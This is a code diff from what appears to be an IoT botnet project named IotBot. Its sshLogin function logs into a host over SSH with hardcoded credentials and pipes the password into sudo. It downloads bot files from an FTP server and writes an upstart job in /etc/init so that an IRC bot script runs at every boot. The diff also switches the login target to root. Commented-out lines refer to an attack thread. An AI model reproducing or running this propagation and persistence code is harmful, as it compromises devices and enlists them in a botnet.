@@ -42,10 +42,10 @@ def sshLogin(user, ip, password):
         echo ''' + password + '''| sudo wget --user=user --password=abcd ftp://10.0.0.184:/IotBot/*
         
         echo ''' + password + '''| sudo touch /etc/init/my.conf
-        echo ''' + password + '''| sudo echo 'Description=A test unit' >> /etc/init/my.conf
         
         echo ''' + password + '''| sudo echo 'start on runlevel [234]' >> /etc/init/my.conf
         echo ''' + password + '''| sudo echo 'stop on runlevel [0156]' >> /etc/init/my.conf
+        echo ''' + password + '''| sudo echo '' >> /etc/init/my.conf
         
         echo ''' + password + '''| sudo echo 'exec /usr/bin/python3 /home/kabali/IotBot/irc_bot.py' >> /etc/init/my.conf
         
@@ -138,4 +138,4 @@ if __name__ == '__main__':
     # t2 = Thread(target=attack, args=(q,))
     # t1.start()
     # t2.start()
-    sshLogin("user", "10.1.0.114", "abcd")
+    sshLogin("root", "10.1.0.114", "abcd")
